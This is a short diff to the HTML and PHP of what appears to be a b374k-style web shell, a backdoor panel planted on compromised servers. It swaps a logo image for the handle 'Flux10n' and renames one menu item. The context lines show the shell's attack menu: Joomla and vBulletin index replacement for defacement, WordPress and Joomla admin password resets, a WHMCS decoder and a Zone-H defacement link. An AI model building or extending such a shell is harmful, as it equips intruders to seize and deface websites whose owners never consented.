@@ -701,7 +701,7 @@ statusIn(thetitle)
 <!-- head info start here -->
 <div class="head_info">
 <table ><tr>
-<td><table class="b374k_tbl"><tr><td><a href="?"><span class="asu"><img src="https://telegra.ph/file/4d5ee033f51b5b488bd96.png" style="width:auto; border: 1.5px dashed #00ff00;" /></span></a></td></tr><tr><td><b>Security That Just An Illusion</b></td></tr></table></td>
+<td><table class="b374k_tbl"><tr><td><a href="?"><span class="asu">Flux10n</span></a></td></tr><tr><td><b>Security That Just An Illusion</b></td></tr></table></td>
 <td><?php echo $buff; ?></td>
 </tr></table>
 </div>
@@ -730,7 +730,7 @@ statusIn(thetitle)
 <a href="?<?php echo "y=".$pwd; ?>&amp;x=domain">Domain</a>
 <a href="?<?php echo "y=".$pwd; ?>&amp;x=jodexer">Joomla IndChange</a>
 <a href="?<?php echo "y=".$pwd; ?>&amp;x=vb">VB IndChange</a>
-<a href="?<?php echo "y=".$pwd; ?>&amp;x=wp-reset">Wordpress ResPass</a>
+<a href="?<?php echo "y=".$pwd; ?>&amp;x=wp-reset">WP ResPass</a>
 <a href="?<?php echo "y=".$pwd; ?>&amp;x=jm-reset">Joomla ResPass</a>
 <a href="?<?php echo "y=".$pwd; ?>&amp;x=whmcs">WHMCS Decoder</a>
 <a href="?<?php echo "y=".$pwd; ?>&amp;x=zone">Zone-H</a><br><br>
